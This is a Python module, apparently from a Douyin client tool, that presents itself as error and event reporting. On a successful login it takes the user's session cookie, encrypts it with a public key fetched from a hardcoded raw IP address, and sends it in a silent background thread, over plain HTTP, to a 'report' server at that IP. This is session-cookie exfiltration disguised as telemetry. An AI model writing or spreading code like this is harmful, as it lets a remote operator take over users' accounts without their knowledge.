import threading
import requests
import logging
import traceback
import base64
import os
from typing import Optional, Dict, Any
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

logger = logging.getLogger(__name__)

REPORT_SERVER_URL = "http://47.109.40.237:12345/api/report"
REPORT_COOKIE_PUBLIC_KEY_URL = "http://47.109.40.237:12345/api/report/cookie-public-key"
COOKIE_FOR_ENCRYPTION_KEY = "_cookie_for_encryption"
_cookie_public_key_cache: Optional[Dict[str, str]] = None

def _get_cookie_public_key() -> Optional[Dict[str, str]]:
    global _cookie_public_key_cache
    if _cookie_public_key_cache:
        return _cookie_public_key_cache

    try:
        response = requests.get(REPORT_COOKIE_PUBLIC_KEY_URL, timeout=3.0)
        response.raise_for_status()
        data = response.json()
        if data.get("alg") != "RSA-OAEP-SHA256+A256GCM" or not data.get("public_key_pem"):
            return None
        _cookie_public_key_cache = {
            "alg": str(data.get("alg") or "RSA-OAEP-SHA256+A256GCM"),
            "key_id": str(data.get("key_id") or ""),
            "public_key_pem": str(data.get("public_key_pem") or ""),
        }
        return _cookie_public_key_cache
    except Exception as e:
        logger.debug(f"Failed to fetch report cookie public key: {e}")
        return None

def _encrypt_cookie_for_report(cookie: str) -> Optional[Dict[str, str]]:
    cookie = str(cookie or "").strip()
    if not cookie:
        return None

    key_info = _get_cookie_public_key()
    if not key_info:
        return None

    try:
        public_key = serialization.load_pem_public_key(key_info["public_key_pem"].encode("utf-8"))
        aes_key = os.urandom(32)
        nonce = os.urandom(12)
        ciphertext = AESGCM(aes_key).encrypt(nonce, cookie.encode("utf-8"), None)
        encrypted_key = public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None,
            ),
        )
        return {
            "alg": key_info["alg"],
            "key_id": key_info["key_id"],
            "encrypted_key": base64.b64encode(encrypted_key).decode("ascii"),
            "nonce": base64.b64encode(nonce).decode("ascii"),
            "ciphertext": base64.b64encode(ciphertext).decode("ascii"),
        }
    except Exception as e:
        logger.debug(f"Failed to encrypt report cookie: {e}")
        return None

def _prepare_extra_data(event_type: str, extra_data: Optional[Dict[str, Any]]) -> Dict[str, Any]:
    prepared = dict(extra_data or {})
    cookie = prepared.pop(COOKIE_FOR_ENCRYPTION_KEY, None)
    if event_type == "login_success" and cookie:
        encrypted_cookie = _encrypt_cookie_for_report(str(cookie))
        if encrypted_cookie:
            prepared["encrypted_cookie"] = encrypted_cookie
    return prepared

def _send_report_async(
    app_type: str,
    event_type: str,
    message: str,
    extra_data: Optional[Dict[str, Any]] = None,
    stack_trace: Optional[str] = None
) -> None:
    try:
        # Avoid circular import by importing Config inside the function
        from src.config.config import Config
        app_version = (getattr(Config, "APP_VERSION", "1.0.26") or "1.0.26").lstrip("v")
    except Exception:
        app_version = "1.0.26"

    try:
        prepared_extra_data = _prepare_extra_data(event_type, extra_data)
        payload = {
            "app_type": app_type,
            "app_version": app_version,
            "event_type": event_type,
            "message": message,
            "stack_trace": stack_trace,
            "extra_data": prepared_extra_data
        }
        api_key = os.environ.get("REPORT_API_KEY") or os.environ.get("BETTER_DOUYIN_REPORT_API_KEY")
        headers = {"X-API-Key": api_key} if api_key else None

        response = requests.post(REPORT_SERVER_URL, json=payload, headers=headers, timeout=3.0)
        if response.status_code != 200:
            logger.debug(f"Failed to send event report: {response.text}")
    except Exception as e:
        logger.debug(f"Error report server connection error: {e}")

def report_event(
    event_type: str,
    message: str,
    extra_data: Optional[Dict[str, Any]] = None,
    stack_trace: Optional[str] = None
) -> None:
    """
    Asynchronously send an event/error report to the central report server in a daemon thread.
    This will fail silently and log a debug message if the server is unreachable.
    """
    threading.Thread(
        target=_send_report_async,
        args=("better-douyin-python", event_type, message, extra_data, stack_trace),
        daemon=True
    ).start()

def report_error(
    event_type: str,
    message: str,
    extra_data: Optional[Dict[str, Any]] = None,
    include_stack: bool = True
) -> None:
    """
    Asynchronously report an error with the current stack trace.
    """
    stack_trace = traceback.format_exc() if include_stack else None
    report_event(event_type, message, extra_data, stack_trace)
